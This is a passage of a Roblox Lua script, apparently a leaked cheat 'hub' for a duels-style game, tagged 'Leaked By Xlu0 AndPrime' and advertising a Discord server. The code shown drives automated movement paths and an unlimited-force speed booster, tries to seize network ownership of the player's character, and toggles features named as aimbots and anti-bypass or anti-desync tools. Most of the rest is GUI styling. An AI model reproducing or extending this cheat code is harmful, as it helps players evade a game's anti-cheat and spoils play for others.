            local castDir = v.Unit * reach
            local hitAny = false
            for _, h in ipairs(_G.__SoundWallHeights) do
                local res = workspace:Raycast(hrp.Position + Vector3.new(0, h, 0), castDir, params)
                if res and math.abs(res.Normal.Y) < 0.55 then
                    local n = Vector3.new(res.Normal.X, 0, res.Normal.Z)
                    if n.Magnitude > 0.01 then
                        n = n.Unit
                        local into = v:Dot(n)
                        if into < 0 then
                            v = v - n * into
                            hitAny = true
                        end
                    end
                end
            end
            if not hitAny then break end
        end
        return Vector3.new(v.X, vel.Y, v.Z)
    end)
    if ok and typeof(result) == "Vector3" then return result end
    return vel
end

function _G.SoundZombieEnsureLinearVelocity(hrp)
    local S = _G.SoundZombieMove

    if S.linearVelocity and S.linearVelocity.Parent and S.attachment and S.attachment.Parent == hrp then
        return S.linearVelocity
    end

    if S.linearVelocity then
        pcall(function() S.linearVelocity:Destroy() end)
    end
    if S.attachment then
        pcall(function() S.attachment:Destroy() end)
    end

    local att = Instance.new("Attachment")
    att.Name = "SoundZombieMoveAttachment"
    att.Parent = hrp

    local lv = Instance.new("LinearVelocity")
    lv.Name = "SoundZombieMoveVelocity"
    lv.Attachment0 = att
    lv.RelativeTo = Enum.ActuatorRelativeTo.World
    lv.ForceLimitMode = Enum.ForceLimitMode.PerAxis
    lv.MaxAxesForce = Vector3.new(math.huge, 0, math.huge)
    lv.VectorVelocity = Vector3.zero
    lv.Parent = att

    S.attachment = att
    S.linearVelocity = lv
    return lv
end

function _G.SoundZombieStopVelocity()
    local S = _G.SoundZombieMove
    if S.linearVelocity and S.linearVelocity.Parent then
        S.linearVelocity.VectorVelocity = Vector3.zero
        S.linearVelocity.MaxAxesForce = Vector3.zero
        S.linearVelocity.Enabled = false
    end
end

function _G.SoundStopAutoLeft()
    local S = _G.SoundZombieMove
    if S.leftConn then
        S.leftConn:Disconnect()
        S.leftConn = nil
    end
    S.leftPhase = 1

    local char = LP.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if hum then hum:Move(Vector3.zero, false) end
    _G.SoundZombieStopVelocity()

    if _G.SoundSetAutoLeftVisual then
        pcall(function() _G.SoundSetAutoLeftVisual(false) end)
    end
end

function _G.SoundStopAutoRight()
    local S = _G.SoundZombieMove
    if S.rightConn then
        S.rightConn:Disconnect()
        S.rightConn = nil
    end
    S.rightPhase = 1

    local char = LP.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if hum then hum:Move(Vector3.zero, false) end
    _G.SoundZombieStopVelocity()

    if _G.SoundSetAutoRightVisual then
        pcall(function() _G.SoundSetAutoRightVisual(false) end)
    end
end

function _G.SoundZombieMoveIsFull()
    return (_G.SoundDuelMode == "full")
        or (_G.SoundDuelMode == "Full")
        or (typeof(State) == "table" and State.duelMode == "full")
end

function _G.SoundStartAutoLeft()
    if autoRightEnabled then
        autoRightEnabled = false
        _G.SoundStopAutoRight()
    end

    local S = _G.SoundZombieMove
    if S.leftConn then S.leftConn:Disconnect() end
    S.leftPhase = 1

    S.leftConn = RunService.Heartbeat:Connect(function()
        if not autoLeftEnabled then return end
        if dropBrainrotActive then return end

        local char = LP.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum or hum.Health <= 0 then return end

        local st = hum:GetState()
        if hum.PlatformStand
            or st == Enum.HumanoidStateType.Physics
            or st == Enum.HumanoidStateType.Ragdoll
            or st == Enum.HumanoidStateType.FallingDown then
            hum:Move(Vector3.zero, false)
            _G.SoundZombieStopVelocity()
            return
        end

        local lv = _G.SoundZombieEnsureLinearVelocity(hrp)
        lv.Enabled = true
        lv.MaxAxesForce = Vector3.new(math.huge, 0, math.huge)
        local P = _G.SoundZombieMovePoints
        local spd = _G.SoundGetAutoPathSpeed()

        if _G.SoundZombieMoveIsFull() then
            local points = P.FullLeft
            if S.leftPhase > #points then
                _G.SoundZombieStopVelocity()
                local prev = points[#points - 1] or points[#points]
                hrp.CFrame = CFrame.new(hrp.Position, Vector3.new(prev.X, hrp.Position.Y, prev.Z))
                hrp.AssemblyLinearVelocity = Vector3.new(0, hrp.AssemblyLinearVelocity.Y, 0)
                hum:Move(Vector3.zero, false)
                pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)
                autoLeftEnabled = false
                if S.leftConn then S.leftConn:Disconnect(); S.leftConn = nil end
                S.leftPhase = 1
                if _G.SoundSetAutoLeftVisual then _G.SoundSetAutoLeftVisual(false) end
                return
            end

            local tgt = points[S.leftPhase]
            local flat = Vector3.new(tgt.X, hrp.Position.Y, tgt.Z)
            if (flat - hrp.Position).Magnitude < 1 then
                S.leftPhase += 1
                return
            end

            local dir = (flat - hrp.Position).Unit
            local fspd = (S.leftPhase <= 2)
                and _G.SoundGetAutoPathSpeed()
                or _G.SoundGetAutoPathCarrySpeed()

            lv.VectorVelocity = _G.SoundSlideAlongWall(hrp, Vector3.new(dir.X * fspd, 0, dir.Z * fspd))
        else
            if S.leftPhase == 1 then
                local tgt = Vector3.new(P.L1.X, hrp.Position.Y, P.L1.Z)
                if (tgt - hrp.Position).Magnitude < 1 then
                    S.leftPhase = 2
                    return
                end

                local d = P.L1 - hrp.Position
                local mv = Vector3.new(d.X, 0, d.Z).Unit
                lv.VectorVelocity = _G.SoundSlideAlongWall(hrp, Vector3.new(mv.X * spd, 0, mv.Z * spd))
            else
                local tgt = Vector3.new(P.L2.X, hrp.Position.Y, P.L2.Z)
                if (tgt - hrp.Position).Magnitude < 1 then
                    hum:Move(Vector3.zero, false)
                    _G.SoundZombieStopVelocity()
                    hrp.AssemblyLinearVelocity = Vector3.new(0, hrp.AssemblyLinearVelocity.Y, 0)
                    hum:Move(Vector3.zero, false)
                    pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)
                    autoLeftEnabled = false
                    if S.leftConn then S.leftConn:Disconnect(); S.leftConn = nil end
                    S.leftPhase = 1
                    if _G.SoundSetAutoLeftVisual then _G.SoundSetAutoLeftVisual(false) end
                    if P.LFace and (P.LFace - hrp.Position).Magnitude > 0.01 then
                        hrp.CFrame = CFrame.new(hrp.Position, Vector3.new(P.LFace.X, hrp.Position.Y, P.LFace.Z))
                    end
                    return
                end

                local d = P.L2 - hrp.Position
                local mv = Vector3.new(d.X, 0, d.Z).Unit
                lv.VectorVelocity = _G.SoundSlideAlongWall(hrp, Vector3.new(mv.X * spd, 0, mv.Z * spd))
            end
        end
    end)
end

function _G.SoundStartAutoRight()
    if autoLeftEnabled then
        autoLeftEnabled = false
        _G.SoundStopAutoLeft()
    end

    local S = _G.SoundZombieMove
    if S.rightConn then S.rightConn:Disconnect() end
    S.rightPhase = 1

    S.rightConn = RunService.Heartbeat:Connect(function()
        if not autoRightEnabled then return end
        if dropBrainrotActive then return end

        local char = LP.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum or hum.Health <= 0 then return end

        local st = hum:GetState()
        if hum.PlatformStand
            or st == Enum.HumanoidStateType.Physics
            or st == Enum.HumanoidStateType.Ragdoll
            or st == Enum.HumanoidStateType.FallingDown then
            hum:Move(Vector3.zero, false)
            _G.SoundZombieStopVelocity()
            return
        end

        local lv = _G.SoundZombieEnsureLinearVelocity(hrp)
        lv.Enabled = true
        lv.MaxAxesForce = Vector3.new(math.huge, 0, math.huge)
        local P = _G.SoundZombieMovePoints
        local spd = _G.SoundGetAutoPathSpeed()

        if _G.SoundZombieMoveIsFull() then
            local points = P.FullRight
            if S.rightPhase > #points then
                _G.SoundZombieStopVelocity()
                local prev = points[#points - 1] or points[#points]
                hrp.CFrame = CFrame.new(hrp.Position, Vector3.new(prev.X, hrp.Position.Y, prev.Z))
                hrp.AssemblyLinearVelocity = Vector3.new(0, hrp.AssemblyLinearVelocity.Y, 0)
                hum:Move(Vector3.zero, false)
                pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)
                autoRightEnabled = false
                if S.rightConn then S.rightConn:Disconnect(); S.rightConn = nil end
                S.rightPhase = 1
                if _G.SoundSetAutoRightVisual then _G.SoundSetAutoRightVisual(false) end
                return
            end

            local tgt = points[S.rightPhase]
            local flat = Vector3.new(tgt.X, hrp.Position.Y, tgt.Z)
            if (flat - hrp.Position).Magnitude < 1 then
                S.rightPhase += 1
                return
            end

            local dir = (flat - hrp.Position).Unit
            local fspd = (S.rightPhase <= 2)
                and _G.SoundGetAutoPathSpeed()
                or _G.SoundGetAutoPathCarrySpeed()

            lv.VectorVelocity = _G.SoundSlideAlongWall(hrp, Vector3.new(dir.X * fspd, 0, dir.Z * fspd))
        else
            if S.rightPhase == 1 then
                local tgt = Vector3.new(P.R1.X, hrp.Position.Y, P.R1.Z)
                if (tgt - hrp.Position).Magnitude < 1 then
                    S.rightPhase = 2
                    return
                end

                local d = P.R1 - hrp.Position
                local mv = Vector3.new(d.X, 0, d.Z).Unit
                lv.VectorVelocity = _G.SoundSlideAlongWall(hrp, Vector3.new(mv.X * spd, 0, mv.Z * spd))
            else
                local tgt = Vector3.new(P.R2.X, hrp.Position.Y, P.R2.Z)
                if (tgt - hrp.Position).Magnitude < 1 then
                    hum:Move(Vector3.zero, false)
                    _G.SoundZombieStopVelocity()
                    hrp.AssemblyLinearVelocity = Vector3.new(0, hrp.AssemblyLinearVelocity.Y, 0)
                    hum:Move(Vector3.zero, false)
                    pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)
                    autoRightEnabled = false
                    if S.rightConn then S.rightConn:Disconnect(); S.rightConn = nil end
                    S.rightPhase = 1
                    if _G.SoundSetAutoRightVisual then _G.SoundSetAutoRightVisual(false) end
                    if P.RFace and (P.RFace - hrp.Position).Magnitude > 0.01 then
                        hrp.CFrame = CFrame.new(hrp.Position, Vector3.new(P.RFace.X, hrp.Position.Y, P.RFace.Z))
                    end
                    return
                end

                local d = P.R2 - hrp.Position
                local mv = Vector3.new(d.X, 0, d.Z).Unit
                lv.VectorVelocity = _G.SoundSlideAlongWall(hrp, Vector3.new(mv.X * spd, 0, mv.Z * spd))
            end
        end
    end)
end

--Leaked By Xlu0 AndPrime--
function _G.SoundSetAutoLeft(on, skipSave)
    autoLeftEnabled = on == true
    if autoLeftEnabled then
        -- Auto matikan aimbot saat AutoLeft aktif
        if _G.SoundNormalAimbotOn and _G.SoundStopNormalAimbot then _G.SoundStopNormalAimbot() end
        if _G.SoundAntiBypassAimbotOn and _G.SoundStopAntiBypassAimbot then _G.SoundStopAntiBypassAimbot(false) end
        autoRightEnabled = false
        _G.SoundStopAutoRight()
        _G.SoundStartAutoLeft()
    else
        _G.SoundStopAutoLeft()
    end
    if _G.SoundSetAutoLeftVisual then _G.SoundSetAutoLeftVisual(autoLeftEnabled) end
end

function _G.SoundSetAutoRight(on, skipSave)
    autoRightEnabled = on == true
    if autoRightEnabled then
        -- Auto matikan aimbot saat AutoRight aktif
        if _G.SoundNormalAimbotOn and _G.SoundStopNormalAimbot then _G.SoundStopNormalAimbot() end
        if _G.SoundAntiBypassAimbotOn and _G.SoundStopAntiBypassAimbot then _G.SoundStopAntiBypassAimbot(false) end
        autoLeftEnabled = false
        _G.SoundStopAutoLeft()
        _G.SoundStartAutoRight()
    else
        _G.SoundStopAutoRight()
    end
    if _G.SoundSetAutoRightVisual then _G.SoundSetAutoRightVisual(autoRightEnabled) end
end
--Leaked By Xlu0 AndPrime--

LP.CharacterAdded:Connect(function()
task.wait(0.5)
if autoLeftEnabled and _G.SoundStartAutoLeft then _G.SoundStartAutoLeft() end
if autoRightEnabled and _G.SoundStartAutoRight then _G.SoundStartAutoRight() end
end)
local overheadGui = nil
local overheadSpeedLabel = nil
speedLabel = nil

local function addShimmerToLabel(lbl, color1, color2)
    local gr = Instance.new("UIGradient", lbl)
    gr.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, color1 or Color3.fromRGB(200, 200, 200)),
        ColorSequenceKeypoint.new(0.5, color2 or Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, color1 or Color3.fromRGB(200, 200, 200))
    })
    gr.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.3, 0),
        NumberSequenceKeypoint.new(0.5, 0, 0),
        NumberSequenceKeypoint.new(1, 0.3, 0)
    })
    return gr
end

local function getSpeedThemeColors()
    local accent = Color3.fromRGB(255, 255, 255)
    local accent2 = Color3.fromRGB(200, 200, 200)
    local gray = Color3.fromRGB(170, 170, 175)
    return accent, accent2, gray
end

local function applySpeedIndicatorTheme()
    local char = LP.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end
    local bb = head:FindFirstChild("SoundSpeedBB")
    if not bb then return end

    local accent, accent2, gray = getSpeedThemeColors()

    for _, lbl in ipairs(bb:GetChildren()) do
        if lbl:IsA("TextLabel") then
            if lbl.Name == "DiscordLbl" then
                lbl.TextColor3 = gray
                local gr = lbl:FindFirstChildOfClass("UIGradient")
                if gr then
                    gr.Color = ColorSequence.new({
                        ColorSequenceKeypoint.new(0, gray),
                        ColorSequenceKeypoint.new(0.5, accent),
                        ColorSequenceKeypoint.new(1, gray)
                    })
                end
            else
                lbl.TextColor3 = accent
                local gr = lbl:FindFirstChildOfClass("UIGradient")
                if gr then
                    gr.Color = ColorSequence.new({
                        ColorSequenceKeypoint.new(0, accent2),
                        ColorSequenceKeypoint.new(0.5, accent),
                        ColorSequenceKeypoint.new(1, accent2)
                    })
                end
            end
        end
    end
end

local function setupSpeedIndicator(char)
    if not char then return end
    local head = char:FindFirstChild("Head") or char:WaitForChild("Head", 5)
    if not head then return end

    pcall(function()
        local old = head:FindFirstChild("SoundSpeedBB")
        if old then old:Destroy() end
        local old2 = head:FindFirstChild("SoundDuelsOverheadInfo")
        if old2 then old2:Destroy() end
    end)

    if overheadGui then
        pcall(function() overheadGui:Destroy() end)
        overheadGui = nil
    end
    speedLabel = nil
    overheadSpeedLabel = nil

    local accent, accent2, gray = getSpeedThemeColors()

    local bb = Instance.new("BillboardGui")
    bb.Name = "SoundSpeedBB"
    bb.Size = UDim2.new(0, 130, 0, 48)
    bb.StudsOffset = Vector3.new(0, 3.2, 0)
    bb.AlwaysOnTop = true
    bb.MaxDistance = 80
    bb.Parent = head
    overheadGui = bb

    local discordLabel = Instance.new("TextLabel", bb)
    discordLabel.Name = "DiscordLbl"
    discordLabel.Size = UDim2.new(1, 0, 0.38, 0)
    discordLabel.BackgroundTransparency = 1
    discordLabel.Text = "discord.gg/hwwWrXUbV"
    discordLabel.TextColor3 = gray
    discordLabel.Font = Enum.Font.GothamBold
    discordLabel.TextScaled = true
    discordLabel.TextStrokeTransparency = 0.4

    speedLabel = Instance.new("TextLabel", bb)
    speedLabel.Name = "SpeedLbl"
    speedLabel.Size = UDim2.new(1, 0, 0.55, 0)
    speedLabel.Position = UDim2.new(0, 0, 0.38, 0)
    speedLabel.BackgroundTransparency = 1
    speedLabel.Text = "0.0"
    speedLabel.TextColor3 = accent
    speedLabel.Font = Enum.Font.GothamBold
    speedLabel.TextScaled = true
    speedLabel.TextStrokeTransparency = 0.35
    overheadSpeedLabel = speedLabel

    local gr1 = addShimmerToLabel(speedLabel, accent2, accent)
    local gr2 = addShimmerToLabel(discordLabel, gray, accent)

    task.spawn(function()
        local t = 0
        while bb and bb.Parent do
            t = t + 0.03
            pcall(function()
                gr1.Offset = Vector2.new(math.sin(t) * 0.4, 0)
                gr2.Offset = Vector2.new(math.sin(t) * 0.4, 0)
            end)
            task.wait(0.05)
        end
    end)
end

local function setupOverheadInfo(char)
    setupSpeedIndicator(char)
end

-- keep ragdoll countdown helpers (label is optional/nil-safe)
ragdollCountdownLabel = nil
local ragdollCountdownConn = nil
local ragdollCountdownCharConn = nil
local ragdollCountdownEndTime = 0
local RAGDOLL_COUNTDOWN_SECONDS = 3.0

local function isRagdollStateForCountdown()
    local char = LP.Character
    if not char then return false end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return false end
    local st = hum:GetState()
    if hum.PlatformStand then return true end
    if st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll or st == Enum.HumanoidStateType.FallingDown then
        return true
    end
    local endTime = LP:GetAttribute("RagdollEndTime")
    if endTime and (endTime - workspace:GetServerTimeNow()) > 0 then
        return true
    end
    return false
end

local function beginCountdown()
    ragdollCountdownEndTime = tick() + RAGDOLL_COUNTDOWN_SECONDS
end

local function hookRagdollCountdown(char)
    if ragdollCountdownConn then
        pcall(function() ragdollCountdownConn:Disconnect() end)
        ragdollCountdownConn = nil
    end
    if not ragdollCountdownEnabled then return end
    beginCountdown()
    ragdollCountdownConn = RunService.Heartbeat:Connect(function()
        if not ragdollCountdownEnabled then return end
        if isRagdollStateForCountdown() and ragdollCountdownEndTime < tick() then
            beginCountdown()
        end
    end)
end

local function stopRagdollCountdown()
    if ragdollCountdownConn then
        pcall(function() ragdollCountdownConn:Disconnect() end)
        ragdollCountdownConn = nil
    end
end

if LP.Character then
    task.spawn(function()
        setupSpeedIndicator(LP.Character)
        task.wait(0.05)
        if ragdollCountdownEnabled then hookRagdollCountdown(LP.Character) end
    end)
end
LP.CharacterAdded:Connect(function(char)
    task.wait(0.5)
    setupSpeedIndicator(char)
    if ragdollCountdownEnabled then hookRagdollCountdown(char) end
end)

-- S2 Hub-style speed booster (LinearVelocity constraint, plane mode)
do
local _s2SpeedAttachment = nil
local _s2SpeedLinearVelocity = nil
local _s2MoveKeys = {
    [Enum.KeyCode.W] = true, [Enum.KeyCode.A] = true, [Enum.KeyCode.S] = true, [Enum.KeyCode.D] = true,
    [Enum.KeyCode.Up] = true, [Enum.KeyCode.Left] = true, [Enum.KeyCode.Down] = true, [Enum.KeyCode.Right] = true,
}

local function destroySpeedVelocity()
    if _s2SpeedLinearVelocity then pcall(function() _s2SpeedLinearVelocity:Destroy() end); _s2SpeedLinearVelocity = nil end
    if _s2SpeedAttachment then pcall(function() _s2SpeedAttachment:Destroy() end); _s2SpeedAttachment = nil end
end

local function setupSpeedVelocity(root)
    destroySpeedVelocity()
    if not root then return nil end
    pcall(function()
        if root.SetNetworkOwner then root:SetNetworkOwner(LP) end
    end)
    local attachment = Instance.new("Attachment")
    attachment.Name = "S2SpeedAttachment"
    attachment.Parent = root
    local linearVelocity = Instance.new("LinearVelocity")
    linearVelocity.Name = "S2SpeedVelocity"
    linearVelocity.Attachment0 = attachment
    linearVelocity.RelativeTo = Enum.ActuatorRelativeTo.World
    linearVelocity.VelocityConstraintMode = Enum.VelocityConstraintMode.Plane
    linearVelocity.PrimaryTangentAxis = Vector3.new(1, 0, 0)
    linearVelocity.SecondaryTangentAxis = Vector3.new(0, 0, 1)
    linearVelocity.MaxForce = math.huge
    linearVelocity.PlaneVelocity = Vector2.zero
    linearVelocity.Enabled = true
    linearVelocity.Parent = attachment
    _s2SpeedAttachment = attachment
    _s2SpeedLinearVelocity = linearVelocity
    return linearVelocity
end

local function ensureNetworkOwnership(char)
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    pcall(function()
        if root.SetNetworkOwner then root:SetNetworkOwner(LP) end
    end)
end
LP.CharacterAdded:Connect(function(char)
    destroySpeedVelocity()
    char:WaitForChild("HumanoidRootPart", 5)
    ensureNetworkOwnership(char)
end)
if LP.Character then
    task.spawn(function()
        LP.Character:WaitForChild("HumanoidRootPart", 5)
        ensureNetworkOwnership(LP.Character)
    end)
end

RunService.RenderStepped:Connect(function(dt)
    _moveDt = dt
    local char = LP.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hum or not hrp then return end

    if isRagdollState(hum) then
        lastMoveDir = Vector3.new(0, 0, 0)
        _speedActive = false
        _lastHorizSpeed = 0
        destroySpeedVelocity()
        return
    end

    if not speedBoosterEnabled then
        destroySpeedVelocity()
        return
    end

    local spd = getActiveMoveSpeed()
    local autoBatEnabled = (_G.SoundNormalAimbotOn == true) or (_G.SoundAntiBypassAimbotOn == true)
    local tpBatEnabled = (_G.SoundAntiDesyncAimbotOn == true)
    local batV2On = (antiBatBypassEnabled == true)
    local controlled = not autoBatEnabled and not tpBatEnabled and not batV2On
        and not autoLeftEnabled and not autoRightEnabled

    pcall(function()
        if hum.CameraOffset.Magnitude > 0.05 then
            hum.CameraOffset = Vector3.new(0, 0, 0)
        end
    end)

    if controlled then
        local linearVelocity = _s2SpeedLinearVelocity
        if not linearVelocity or not _s2SpeedAttachment or _s2SpeedAttachment.Parent ~= hrp then
            linearVelocity = setupSpeedVelocity(hrp)
        end
        local md = hum.MoveDirection
        local dir = nil
        if md.Magnitude > 0.05 then
            lastMoveDir = Vector3.new(md.X, 0, md.Z)
            dir = md
        elseif antiRagdollEnabled and lastMoveDir.Magnitude > 0 then
            for key in pairs(_s2MoveKeys) do
                if UIS:IsKeyDown(key) then dir = lastMoveDir; break end
            end
        end
        if linearVelocity then
            if dir then
                local flat = Vector3.new(dir.X, 0, dir.Z)
                if flat.Magnitude > 0 then
                    flat = flat.Unit
                    local wv = _G.SoundSlideAlongWall(hrp, flat * spd)
                    linearVelocity.PlaneVelocity = Vector2.new(wv.X, wv.Z)
                    _speedActive = true
                    _lastHorizSpeed = spd
                else
                    linearVelocity.PlaneVelocity = Vector2.zero
                    _speedActive = false
                    _lastHorizSpeed = 0
                end
            else
                linearVelocity.PlaneVelocity = Vector2.zero
                _speedActive = false
                _lastHorizSpeed = 0
            end
        end
    else
        destroySpeedVelocity()
        _speedActive = false
        _lastHorizSpeed = 0
        if not batV2On then brakeHorizontal(hrp) end
    end

    if speedLabel or overheadSpeedLabel then
        local lbl = speedLabel or overheadSpeedLabel
        local display = 0
        if controlled and _speedActive and speedBoosterEnabled then
            display = getActiveMoveSpeed()
        else
            local v = hrp.AssemblyLinearVelocity
            display = Vector3.new(v.X, 0, v.Z).Magnitude
        end
        local rounded = math.floor(display * 10 + 0.5) / 10
        lbl.Text = string.format("%.1f", rounded)
    end
end)
end
local COLORS = {
bg = Color3.fromRGB(24, 12, 38),
row = Color3.fromRGB(39, 20, 61),
row2 = Color3.fromRGB(53, 28, 79),
stroke = Color3.fromRGB(168, 85, 247),
strokeSoft = Color3.fromRGB(112, 55, 170),
white = Color3.fromRGB(255, 255, 255),
textDim = Color3.fromRGB(205, 180, 225),
toggleBg = Color3.fromRGB(58, 31, 83),
knob = Color3.fromRGB(245, 235, 255),
accent = Color3.fromRGB(168, 85, 247),
accentSoft = Color3.fromRGB(192, 132, 252),
}
function corner(parent, radius)
local c = Instance.new("UICorner")
c.CornerRadius = UDim.new(0, radius or 8)
c.Parent = parent
return c
end
function stroke(parent, color, thickness, transparency)
local s = Instance.new("UIStroke")
s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
s.Color = color or COLORS.accent or COLORS.stroke
s.Thickness = thickness or 1.2
s.Transparency = transparency or 0.25
s.Parent = parent
return s
end
function tween(obj, props, time)
TweenService:Create(obj, TweenInfo.new(time or 0.14, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
end
-- Kilau putih yang bergerak (efek putih untuk button)
function addWhiteShimmer(parent, radius, zindex, period, base, shimmerColor)
if not parent then return nil end
local old = parent:FindFirstChild("WhiteFX")
if old then old:Destroy() end
local fx = Instance.new("Frame")
fx.Name = "WhiteFX"
fx.BackgroundColor3 = shimmerColor or Color3.fromRGB(255, 255, 255)
fx.BorderSizePixel = 0
fx.Active = false
fx.Size = UDim2.new(1, 0, 1, 0)
fx.ZIndex = zindex or parent.ZIndex
fx.Parent = parent
local fc = Instance.new("UICorner")
fc.CornerRadius = UDim.new(0, radius or 8)
fc.Parent = fx
local g = Instance.new("UIGradient")
g.Rotation = 20
g.Transparency = NumberSequence.new({
NumberSequenceKeypoint.new(0.00, 1),
NumberSequenceKeypoint.new(0.34, 1),
NumberSequenceKeypoint.new(0.50, base or 0.86),
NumberSequenceKeypoint.new(0.66, 1),
NumberSequenceKeypoint.new(1.00, 1),
})
g.Offset = Vector2.new(-1, 0)
g.Parent = fx
task.spawn(function()
task.wait(math.random() * 2)
pcall(function()
TweenService:Create(g, TweenInfo.new(period or 3.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, false), {Offset = Vector2.new(1, 0)}):Play()
end)
end)
return fx
end


function _G.SoundAddMovingEdgeLight(btn)
if not btn or not btn:IsA("GuiButton") then return end
if btn.Name ~= "ArrowButton" then return end
if btn:FindFirstChild("SoundMovingEdge") then return end

local edge = Instance.new("UIStroke")
edge.Name = "SoundMovingEdge"
edge.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
edge.Color = Color3.fromRGB(255,255,255)
edge.Thickness = 1.35
edge.Transparency = 0.24
edge.LineJoinMode = Enum.LineJoinMode.Round
edge.Parent = btn

local grad = Instance.new("UIGradient")
grad.Name = "MovingLight"
grad.Rotation = 0
grad.Color = ColorSequence.new({
ColorSequenceKeypoint.new(0.00, Color3.fromRGB(95,95,95)),
ColorSequenceKeypoint.new(0.38, Color3.fromRGB(125,125,125)),
ColorSequenceKeypoint.new(0.46, Color3.fromRGB(235,235,235)),
ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255,255,255)),
ColorSequenceKeypoint.new(0.54, Color3.fromRGB(235,235,235)),
ColorSequenceKeypoint.new(0.62, Color3.fromRGB(125,125,125)),
ColorSequenceKeypoint.new(1.00, Color3.fromRGB(95,95,95))
})
grad.Transparency = NumberSequence.new({
NumberSequenceKeypoint.new(0.00, 0.90),
NumberSequenceKeypoint.new(0.37, 0.82),
NumberSequenceKeypoint.new(0.45, 0.28),
NumberSequenceKeypoint.new(0.50, 0.00),
NumberSequenceKeypoint.new(0.55, 0.28),
NumberSequenceKeypoint.new(0.63, 0.82),
NumberSequenceKeypoint.new(1.00, 0.90)
})
grad.Parent = edge

local info = TweenInfo.new(1.15, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, false, 0)
pcall(function()
TweenService:Create(grad, info, {Rotation = 360}):Play()
end)
end

function _G.SoundApplyMovingEdgeLights(root)
root = root or PlayerGui
if not root then return end

for _, obj in ipairs(root:GetDescendants()) do
if (obj:IsA("TextButton") or obj:IsA("ImageButton")) and obj.Name == "ArrowButton" then
pcall(function() _G.SoundAddMovingEdgeLight(obj) end)
end
end

root.DescendantAdded:Connect(function(obj)
if (obj:IsA("TextButton") or obj:IsA("ImageButton")) and obj.Name == "ArrowButton" then
task.defer(function()
task.wait()
pcall(function() _G.SoundAddMovingEdgeLight(obj) end)
end)
end
end)
end

function makeDraggable(frame)
local dragging, dragStart, startPos, dragInput = false, nil, nil, nil
local function finish(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end
frame.InputBegan:Connect(function(input)
    if _G.SoundGuiLocked == true then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging, dragStart, startPos = true, input.Position, frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then finish(input) end
        end)
    end
end)
frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
end)
UserInputService.InputChanged:Connect(function(input)
    if _G.SoundGuiLocked == true or not dragging or not startPos or not dragStart then return end
    if input == dragInput then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(finish)
end

local Gui = Instance.new("ScreenGui")
Gui.Name = "SoundHubPolished"
Gui.ResetOnSpawn = false
Gui.IgnoreGuiInset = true
Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Gui.DisplayOrder = 999
safeParentGui(Gui)
local FULL_MAIN_SIZE = UDim2.new(0, 370, 0, 430)
local Main = Instance.new("Frame")
Main.Name = "Main"
Main.AnchorPoint = Vector2.new(0, 0.5)
Main.Size = FULL_MAIN_SIZE
Main.Position = tableToUDim2(savedMainPositionTable, UDim2.new(0, 20, 0.5, 22))
savedMainPositionTable = udim2ToTable(Main.Position)
-- Responsive scaling keeps the panel within the viewport on smaller screens.
local MainScale = Instance.new("UIScale")
MainScale.Name = "SoundResponsiveScale"
MainScale.Scale = 1
MainScale.Parent = Main
local function updateMainScale()
    local camera = workspace.CurrentCamera
    if not camera then return end
    local viewport = camera.ViewportSize
    MainScale.Scale = math.clamp(math.min(1, (viewport.X - 24) / 370, (viewport.Y - 24) / 430), 0.55, 1)
    local scaledWidth, scaledHeight = 370 * MainScale.Scale, 430 * MainScale.Scale
    local pos = Main.Position
    local x = math.clamp(pos.X.Offset, 4, math.max(4, viewport.X - scaledWidth - 4))
    local y = math.clamp(pos.Y.Offset, scaledHeight / 2 + 4, math.max(scaledHeight / 2 + 4, viewport.Y - scaledHeight / 2 - 4))
    Main.Position = UDim2.new(0, x, 0, y)
end
if workspace.CurrentCamera then workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updateMainScale) end
workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function() task.defer(updateMainScale) end)
updateMainScale()


-- SoundOpenMainUI / SoundCloseMainUI defined after MiniFrame


Main.BackgroundColor3 = COLORS.bg
Main.BorderSizePixel = 0
Main.Active = true
Main.ClipsDescendants = false
Main.Parent = Gui
corner(Main, 30)
stroke(Main, Color3.fromRGB(168, 85, 247), 1.4, 0.18)

-- Efek hantu di menu utama

-- UI idle transparency: after 5s without interaction, toggles fade a bit
_G.SoundUILastInteract = tick()
_G.SoundUIIdleTransparent = false
local function _exeSetUIIdle(transparent)
